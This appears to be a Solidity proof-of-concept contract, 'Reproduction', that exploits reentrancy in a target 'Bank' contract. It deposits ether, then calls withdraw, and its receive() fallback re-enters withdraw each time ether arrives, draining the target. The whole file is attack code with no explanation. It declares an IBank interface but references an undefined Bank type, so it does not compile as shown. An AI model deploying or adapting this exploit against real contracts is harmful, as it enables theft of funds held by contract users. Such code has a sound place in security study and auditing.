interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    Bank public target;
    address public owner;

    constructor(address _target) {
        target = Bank(_target);
        owner = msg.sender;
    }

    function setup() external payable {
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        require(msg.sender == owner);
        target.withdraw(amount);
    }

    receive() external payable {
        target.withdraw(msg.value);
    }
}